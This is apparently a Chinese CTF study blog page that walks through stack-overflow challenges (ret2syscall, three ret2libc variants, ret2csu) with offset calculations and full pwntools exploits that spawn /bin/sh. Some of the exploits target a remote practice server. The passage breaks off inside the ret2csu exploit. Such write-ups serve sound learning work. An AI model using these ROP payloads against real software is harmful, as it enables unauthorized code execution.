+
+
+<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616194848607.png" alt="image-20220616194848607" style="zoom:80%;" />
+
+<p>32位，开启了NX保护</p>
+<p>ida查看程序文件</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617102809148.png" alt="image-20220617102809148" style="zoom:80%;" />
+
+<p>看到了危险函数gets函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105411878.png" alt="image-20220617105411878" style="zoom:80%;" />
+
+<p>跟前面一样，动调算一下偏移值</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105536928.png" alt="image-20220617105536928" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">esp            0xffffcf30         </span><br><span class="line">ebp            0xffffcfb8 </span><br><span class="line">v4---&gt;esp+0x1c=0xffffcf4c</span><br><span class="line">v4相对于ebp偏移---&gt;offset=0x6c</span><br><span class="line">因为是32位，故v4相对于返回地址的偏移---&gt;0x6c+4</span><br></pre></td></tr></table></figure>
+
+<p>可以利用系统调用来获取shell，比较常用的是下面这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure>
+
+<p>对于对应的参数，可以借鉴这个网站：<a target="_blank" rel="noopener" href="https://publicki.top/old/syscall.html">https://publicki.top/old/syscall.html</a></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617112104732.png" alt="image-20220617112104732" style="zoom:80%;" />
+
+<p>使用ROPgadget查找gadgets</p>
+<p>eax的gadgets</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160518058.png" alt="image-20220617160518058" style="zoom:80%;" />
+
+<p>使用我选中的那一行可以直接对ebx、ecx、edx进行赋值</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160816757.png" alt="image-20220617160816757" style="zoom:80%;" />
+
+<p>&#x2F;bin&#x2F;sh这个字符串的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161022248.png" alt="image-20220617161022248" style="zoom:80%;" />
+
+<p>int 0x80的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161107749.png" alt="image-20220617161107749" style="zoom:80%;" />
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./rop&#x27;)</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#之前计算的需要填充的偏移</span></span><br><span class="line">pop_eax=<span class="number">0x080bb196</span>									<span class="comment">#eax,ret</span></span><br><span class="line">pop_e3x=<span class="number">0x0806eb90</span>									<span class="comment">#edx,ecx,ebx,ret</span></span><br><span class="line">bin_sh=<span class="number">0x080be408</span>									<span class="comment">#/bin/sh				</span></span><br><span class="line">int_0x80=<span class="number">0x08049421</span>									<span class="comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(pop_eax)+p32(<span class="number">0x0b</span>)+p32(pop_e3x)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)										   <span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165348158.png" alt="image-20220617165348158" style="zoom:80%;" />
+
+
+
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617202842455.png" alt="image-20220617202842455" style="zoom:80%;" />
+
+<p>32位，开启NX检查</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203134019.png" alt="image-20220617203134019" style="zoom:80%;" />
+
+<p>查看调用了的一些函数，可以看到gets、system函数</p>
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203657889.png" alt="image-20220617203657889" style="zoom: 80%;" />
+
+<p>发现可以造成溢出的gets寒素</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203738980.png" alt="image-20220617203738980" style="zoom:80%;" />
+
+<p>在plt表中可以看到调用了system函数(在初始页面按ctrl+s选择plt表跳转)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204005123.png" alt="image-20220617204005123" style="zoom:80%;" />
+
+<p>在查看字符串的时候(shift+f12)，发现字符串&#x2F;bin&#x2F;sh</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204301525.png" alt="image-20220617204301525" style="zoom:80%;" />
+
+<p>现在整理一下可以利用的东西：可以造成溢出的gets函数、系统调用函数system以及字符串&#x2F;bin&#x2F;sh</p>
+<p>除了可以通过ida直接查看字符串的地址，还可以通过ROPgadget</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617205228929.png" alt="image-20220617205228929" style="zoom:80%;" />
+
+
+
+<p>计算s和返回地址的偏移(方法和前面一样)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204730342.png" alt="image-20220617204730342" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">esp            0xffffcf10       </span><br><span class="line">ebp            0xffffcf98</span><br><span class="line"></span><br><span class="line">s:esp+0x1c=0xffffcf2c</span><br><span class="line">s相对于ebp的偏移：offset=ebp-s=0x6c</span><br><span class="line">s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数的栈溢出修改返回地址并使之执行system(“&#x2F;bin&#x2F;sh”)，拿到shell</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#需要填充的垃圾数据</span></span><br><span class="line">bin_sh=<span class="number">0x08048720</span>									<span class="comment">#先前查询的地址</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]						<span class="comment">#可以使用pwntools库中的函数直接查找，也可以像下面这样把ida中找到的直接写出来</span></span><br><span class="line"><span class="comment">#system=0x08048460</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)	<span class="comment">#构造payload，中间加了b&#x27;bbbb&#x27;是因为在调用函数的时候，同时需要一个对应的返回地址，这里的b&#x27;bbbb&#x27;作为虚假的地址，因为此时已经拿到了shell</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210035884.png" alt="image-20220617210035884" style="zoom:80%;" />
+
+
+
+<h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210220822.png" alt="image-20220617210220822" style="zoom:80%;" />
+
+<p>和例1一样，32位，开启NX保护</p>
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210500398.png" alt="image-20220617210500398" style="zoom:80%;" />
+
+<p>可以造成栈溢出的gets函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617212503114.png" alt="image-20220617212503114" style="zoom:80%;" />
+
+<p>查看字符串(shift+f12)，和第一题相比，可以看到没有了字符串&#x2F;bin&#x2F;sh</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210556495.png" alt="image-20220617210556495" style="zoom:80%;" />
+
+<p>在plt表中可以找到system函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211320710.png" alt="image-20220617211320710" style="zoom:80%;" />
+
+<p>在bss段可以找到一个连续的空间，并且动调发现bss段可执行</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211915506.png" alt="image-20220617211915506" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211848614.png" alt="image-20220617211848614" style="zoom:80%;" />
+
+<p>计算s和返回地址的偏移</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x13                19</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x80486ba           0x80486ba &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击思路</strong></p>
+<p>和例1很像，不过缺少字符串&#x2F;bin&#x2F;sh，故可以调用gets函数把字符串&#x2F;bin&#x2F;sh写道bss段上，然后修改返回地址执行system(“&#x2F;bin&#x2F;sh”)</p>
+<p>buf2的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214054803.png" alt="image-20220617214054803" style="zoom:80%;" />
+
+<p>pop_ebx</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214223568.png" alt="image-20220617214223568" style="zoom:80%;" />
+
+
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)							</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>						</span><br><span class="line">pop_ebx=<span class="number">0x0804843d</span></span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]					<span class="comment">#可以这样直接调用函数，也可以在ida中查</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]				<span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(gets_plt)+p32(pop_ebx)+p32(buf2_addr)+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(buf2_addr)								<span class="comment">#这里的pop主要是为了返回用的进而执行system函数</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>关于payloa的构造，wiki上面没有详细说明，为了方便理解，画了一张流程图</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/ret2libc2_01.png" alt="ret2libc2_01" style="zoom:80%;" />
+
+<p>我先开始也看不太明白，请教了高师傅后才理解的，后来高师傅还给我推荐了一个构造payload的方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(buf2)+p32(buf2)</span><br></pre></td></tr></table></figure>
+
+<p>这个在栈上的分布如下图所示</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617224122737.png" alt="image-20220617224122737" style="zoom:80%;" />
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617221719649.png" alt="image-20220617221719649" style="zoom:80%;" />
+
+
+
+<h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102115483.png" alt="image-20220618102115483" style="zoom:80%;" />
+
+<p>32位，开启NX保护</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102235365.png" alt="image-20220618102235365" style="zoom:80%;" />
+
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102436248.png" alt="image-20220618102436248" style="zoom:80%;" />
+
+<p>发现危险函数gets函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102526005.png" alt="image-20220618102526005" style="zoom:80%;" />
+
+<p>计算s和返回地址的偏移(方法和之前一样)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x12                18</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x804868a           0x804868a &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:offset=ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>
+
+<p>程序中可以利用的最明显的就是gets函数的溢出。</p>
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数的溢出泄露出libc版本，进而获取到system地址和&#x2F;bin&#x2F;sh地址，再次执行程序出发栈溢出执行system(“&#x2F;bin&#x2F;sh”)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2libc3&#x27;)							#我得本地打不出来，应该和Ubuntu版本有关</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#利用puts函数打印出需要打印的函数的got地址</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#随便选取一个libc库中调用的函数即可，我这里选的是puts的	</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]								<span class="comment">#main函数地址</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(puts_plt)+p32(main)+p32(puts_got)	<span class="comment">#构造payload，这里修改返回调用为puts(puts_got)，puts函数的返回地址为主函数，方便泄露完成后构造shellc获取shell</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])			<span class="comment">#一般got地址是以\xf7开头，也可以像网上那样写，如下</span></span><br><span class="line"><span class="comment">#puts_addr=u32(sh.recv()[0:4])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))		<span class="comment">#打印出来看看</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)					<span class="comment">#利用库查找出libc</span></span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span>+p32(system)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>当使用LibcSearcher查询不到时候(好像是版本的问题打不出来)，可以到网上去在线查询，输入相关的函数的地址(后3位即可)，在线查询网：<a target="_blank" rel="noopener" href="https://publicki.top/libc/">https://publicki.top/libc/</a> 或者 <a target="_blank" rel="noopener" href="https://libc.rip/">https://libc.rip/</a></p>
+<p>本地没pwn掉应该是因为我用的是Ubuntu20的版本问题</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125557365.png" alt="image-20220618125557365" style="zoom:80%;" />
+
+<p>但是远程可以打通的</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125708159.png" alt="image-20220618125708159" style="zoom:80%;" />
+
+
+
+<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>借鉴的博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/AcSuccess/article/details/104448463">https://blog.csdn.net/AcSuccess/article/details/104448463</a></p>
+<p>检查保护</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202733545.png" alt="image-20220618202733545" style="zoom:80%;" />
+
+<p>64位，开启了NX保护，即堆栈段不可执行</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202819738.png" alt="image-20220618202819738" style="zoom:80%;" />
+
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210224594.png" alt="image-20220618210224594" style="zoom:80%;" />
+
+<p>调用的函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210302293.png" alt="image-20220618210302293" style="zoom:80%;" />
+
+<p>可以看到read函数存在栈溢出，因为buf的字长是128，而读入的数据长度是0x200。</p>
+<p>程序中没有system函数的调用，也没有字符串&#x2F;bin&#x2F;sh，故两个都需要自己去构造</p>
+<p><strong>攻击思路</strong></p>
+<p>1、利用栈溢出执行 libc_csu_gadgets 获取 read 函数地址，并使得程序重新执行 main 函数</p>
+<p>2、根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</p>
+<p>3、再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘&#x2F;bin&#x2F;sh’ 地址，并使得程序重新执行 main 函数。</p>
+<p>4、再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘&#x2F;bin&#x2F;sh’) 获取 shell。</p>
+<p>这题ctf-wiki讲的不是很详细，我上网找了找相关的题解，除了借鉴的博客，<a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/ret2csu.html">狼组安全的文库</a>对这个题型进行了详细的讲解</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./level5&#x27;)							#我的本地没有打出来，应该是环境的问题</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">128</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">first_csu=<span class="number">0x400606</span></span><br><span class="line">second_csu=<span class="number">0x4005f0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret_csu</span>(<span class="params">r12,r13,r14,r15,last</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">    payload+=p64(first_csu)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(second_csu)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">start_addr=<span class="number">0x0000000000400460</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload=ret_csu(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,start_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr--&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_addr)))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span 